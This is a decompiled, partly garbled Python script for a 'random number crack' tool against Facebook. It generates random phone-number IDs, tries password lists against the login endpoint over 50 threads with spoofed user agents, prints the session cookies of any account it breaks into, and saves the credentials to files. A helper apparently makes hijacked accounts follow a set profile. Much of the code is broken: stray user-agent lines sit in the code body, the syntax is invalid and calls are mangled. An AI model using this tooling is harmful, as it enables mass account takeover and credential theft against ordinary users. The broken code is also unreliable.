# Source Generated with Decompyle++

# File: test.pyc (Python 3.9)

import os

import sys

import time

import requests

import uuid

os.system('git pull')

os.system('pkg install curl')

class jalan:

    

    def __init__(self, z):

        pass

logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;45mLEGEND\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mLEGEND\x1b[0;m\x1b[1;32m && \x1b[1;33mALONE\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m LEGEND\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-LEGEND\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mLEGEND\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m================= \x1b[32;45mLEGEND\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO LEGEND TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mMOHIDA\x1b[0;m ======================\n'

def ud():

    os.system('clear')

    jalan(logo)

    print(' [1] FOLLW MY FACEBOOK ID )

    print(' [2] EXIT')

    opt = input('\n   Choose option >>> ')

    if opt == '1':

        os.system('xdg-open https://www.facebook.com/muhammad.aslim.1426)

        FD()

        return None

    None('\n\x1b[1;31mEXIT\x1b[0,.97m')

    

    def FD():

    os.system('clear')

    print(logo)

    print('\b[1;33m [1] FOLLOW MY FB ACCOUNT')

    print(' [2] EXIT')

    opt = input('\ \b[1;32m Choose option >>> ')

    if opt == '1':

        os.system('xdg-open https://www.facebook.com/muhammad.aslim.1426')

        o()

         return None

    None('\1b[1;31mEXIT\b[0;97m')

def o():

    os.system('clear')

    jalan(logo)

    jalan('\tðŸ”¥ðŸ”¥RANDOM NUMBER CRACKðŸ”¥ðŸ”¥')

    print('')

    jalan('\x1b[1;32m [1]\x1b[1;33m RANDOM CRACK ')

    jalan('\x1b[1;32m [2] \x1b[1;32mCONTACT ME ON FACEBOOK')

    jalan(' \x1b[1;32m[00] \x1b[1;31mEXIT')

    opt = input('\n   \x1b[1;32m Choose option >>> ')

    if opt == '1':

        i()

    if None == '2':

        os.system('xdg-open https://www.facebook.com/muhammad.aslim.1426)

        return None

    if None == '3':

        os.system('xdg-open https://facebook.com/groups/207678473842318/')

        return None

    if None == '0':

        os.system('exit')

        return None

    None('\n\x1b[1;31m  Choose valid option\x1b[0;97m')

import os,sys,time,json,random,re,string,platform,base64,uuid

os.system("git pull")

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup

import requests as ress

from datetime import date

from datetime import datetime

from time import sleep

from time import sleep as waktu

try:

    import requests

    from concurrent.futures import ThreadPoolExecutor as ThreadPool

    import mechanize

    from requests.exceptions import ConnectionError

except ModuleNotFoundError:

    os.system('pip install mechanize requests futures bs4==2 > /dev/null')

    os.system('pip install bs4')

    

def cek_apk(session,coki):

    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))

    else:

        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

        #else:

            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))

    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))

    else:

        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

        else:

            print('')

 

def follow(self, session, coki):

        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {

            'cookie': coki }, **('cookies',)).text, 'html.parser')

        get = r.find('a', 'Ikuti', **('string',)).get('href')

        session.get('https://free.facebook.com' + str(get), {

            'cookie': coki }, **('cookies',)).text

            

            

 

class jalan:

    def __init__(self, z):

        for e in z + "\n":

            sys.stdout.write(e)

            sys.stdout.flush()

            time.sleep(0.009)

            

RED = '\033[1;91m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m' #

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'    # WARNA MATI

A = '\x1b[1;90m' # WARNA ABU ABU

BN = '\x1b[1;107m' # BELAKANG PUTIH

BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT

BP = '\x1b[1;105m' # BELAKANG PINK

BB = '\x1b[1;104m' # BELAKANG BIRU

BK = '\x1b[1;103m' # BELAKANG KUNING

BH = '\x1b[1;102m' # BELAKANG HIJAU

BM = '\x1b[1;101m' # BELAJANG MERAH

BA = '\x1b[1;100m' # BELAKANG ABU ABU

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

today = date.today()

logo =                                          

\033[1;32m                               

  888                     /                          888 

888      e88~~8e  e88~88e  e88~~8e  888-~88e  e88~\88 

888     d888  88b 888 888 d888  88b 888  888 d888  888 

888     8888__888 "88_88" 8888__888 888  888 8888  888 

888     Y888    ,  /      Y888    , 888  888 Y888  888 

888____  "88___/  Cb       "88___/  888  888  "88_/888 

                   Y8""8D

        

        

    

\033[1;35m       

\033[1;35m       .   

\033[1;32m     .

\033[1;32m        

\033[1;35m        

\033[1;35m        

\033[1;32m         

 

\033[1;37m================= \33[32;45mLEGEND\33[0;m =====================

\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mLEGEND\33[0;m\033[1;32m && \033[1;33m\33[0;m

\033[1;32m     \033[1;32mFACEBOK      : os.system(Âløñê Prince)

\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mTEAM-LEGEND

\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE

\033[1;32m     \033[1;35mTEAM         :  \033[1;35mLEGEND

\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.1

\033[1;37m================= \33[32;45mLEGEND\33[0;m =====================

 

       \33[37;41m\t WELLCOME TO LEGEND TOOL\33[0;m

 

\033[1;37m================== \33[32;45mMOHIDA\33[0;m ======================\n""")

loop = 0

oks = []

cps = []

 

def clear():

    os.system('clear')

    print(logo)

from time import localtime as lt

from os import system as cmd

ltx = int(lt()[3])

if ltx > 12:

    a = ltx-12

    tag = "PM"

else:

    a = ltx

    tag = "AM"

    

    

try:

    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')

    v = 5.2

    update = ('5.2')

    update = ('5.2')

    if str(v) in update:

        os.system('clear')

    else:pass

except:print('\n\033[1;31mNo internet connection ... \033[0;97m')

#global functions

def dynamic(text):

    titik = ['.   ','..  ','... ','.... ']

    for o in titik:

        print('\r'+text+o),

        sys.stdout.flush();time.sleep(1)

 

#User agents

ugen2=[]

ugen=[]

 

for xd in range(10000):

    aa='Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36

    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])

    c=' en-us; GT-'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Mobile Safari/537.36'

    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')

    ugen.append(uaku2)

    Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36

    Mozilla/5.0 (Linux; Android 13; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36

Mozilla/5.0 (Linux; Android 13; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36

Mozilla/5.0 (Linux; Android 13; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36

Mozilla/5.0 (Android 13; Mobile; rv:68.0) Gecko/68.0 Firefox/105.0

Mozilla/5.0 (Android 13; Mobile; LG-M255; rv:105.0) Gecko/105.0 Firefox/105.0

Mozilla/5.0 (Linux; U; Android 4.1.2; en-US; LG-F100L Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36	Android Mozilla/5.0 (X11; Linux x86.64; rv:48.38.1) Gecko/20100101 Firefox/48.38.1

Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A105FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36

Mozilla/5.0 (Linux; Android 11; Armor 11T 5G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36

Mozilla/5.0 (Linux; Android 9; Acer Chromebook 15 (CB3-532) Build/R99-14469.58.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Safari/537.36

Mozilla/5.0 (Linux; Android 11; ANY-NX1 Build/HONORANY-N21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36

Mozilla/5.0 (Linux; Android 7.1.1; A574BL Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36

Mozilla/5.0 (Linux; Android 12; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36

Mozilla/5.0 (Linux; Android 9; TECNO KC3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36

108	Galaxy Note 20 5G

Mozilla/5.0 (Windows NT 5.1; rv:62.0) Gecko/20100101 Firefox/62.0

Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.102 Safari/537.36 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.12785 YaBrowser/13.12.1599.12785 Safari/537.36

Mozilla/5.0 (Linux; Android 5.1; ZTE BLADE A110) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36

Mozilla/5.0 (Linux; Android 8.1.0; PVG100 Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36

Mozilla/5.0 (Linux; Android 8.1.0; ASUS_X00ID) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36

Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4)

AppleWebKit/600.7.12 (KHTML, like Gecko)

Version/8.0.7 Safari/600.7.12

Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) 

AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75

Mobile/14E5239e Safari/602.1

# APK CHECK

def i():

    user=[]

    twf =[]

    os.getuid

    os.geteuid

    os.system("clear")

    jalan(logo)

    

    

    jalan("\033[1;37m\t  USE OUR COUNTRY CODE  ")

    jalan('\033[1;36m     \t     PAK CODES\n     \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97m')

    jalan('\033[1;32m============================================')

    jalan('\033[1;36m     \t     INDIA CODES\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')

    jalan('\033[1;32m============================================')

    jalan('\033[1;36m     \t     BD CODES\n     \033[1;33m88016, \033[1;33m88017 ,\033[1;33m88018 ,\033[1;33m88019  ...\033[0;97m')

    jalan('\033[1;32m============================================\n')

    code = input(' PUT CODE : ')

    print("")

    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(7))

        user.append(nmp)

    os.system("clear")

    print(logo)

    passx = int(input("[*] Enter Password Limit : "))

    HamiiID = []

    print("")

    for bilal in range(passx):

        pww = input("[*] Enter Password : ")

        HamiiID.append(pww)

    with ThreadPool(max_workers=50) as manshera:

        clear()

        tl = str(len(user))

        print('\033[1;36m TOTAL IDS: '+tl)

        print('\033[1;36m THE PROCESS HAS BEEN STARTED')

        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 4 MIN ')

        print('\033[1;32m============================================')

        for love in user:

            pwx = [love[1:]]

            uid = code+love

            for Eman in HamiiID:

                pwx.append(Eman)

            manshera.submit(rcrack,uid,pwx,tl)

    print('\033[1;32m============================================')

    print('Crack process has been completed')

    print('Ids saved in ok.txt,cp.txt')

    print('\033[1;32m============================================')

 

def rcrack(uid,pwx,tl):

    #print(user)

    global loop

    global cps

    global oks

    global proxy

    try:

        for ps in pwx:

            pro = random.choice(ugen)

            session = requests.Session()

            free_fb = session.get('https://free.facebook.com').text

            log_data = {

                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":uid,

            "pass":ps,

            "login":"Log In"}

            header_freefb = {"authority": 'free.facebook.com',

            "method": 'GET',

            "scheme": 'https',

            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',

            "accept-encoding": 'gzip, deflate, br',

            "accept-language": 'en-US,en;q=1',

            'cache-control': 'no-cache, no-store, must-revalidate',

            "referer": 'https://t.facebook.com/',

            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',

            "sec-ch-ua-mobile": '?1',

            "sec-ch-ua-platform": "Windows",

            "sec-fetch-dest": 'document',

            "sec-fetch-mode": 'navigate',

            "sec-fetch-site": 'same-origin',

            "sec-fetch-user": '?0',

            "pragma": 'no-cache',

            "priority": 'u=0',

            'cross-origin-resource-policy': 'cross-origin',

            "upgrade-insecure-requests": '1',

            "user-agent": pro}

            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[7:22]

                print('    \033[1;32m(LEGEND OK)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')

                cek_apk(session,coki)

                open('/sdcard/LEGEND-OK.txt', 'a').write( cid+' | '+ps+'\n')

                oks.append(cid)

                break

            elif 'checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[24:39]

                print('    \33[1;30m(LEGEND-CP)  ' +cid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/LEGEND-CP.txt', 'a').write( cid+' | '+ps+' \n')

                cps.append(cid)

                break

            else:

                continue

        loop+=1

        sys.stdout.write('\r     %s[LEGEND] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),

        sys.stdout.flush()

    except:

        pass

 

ud()
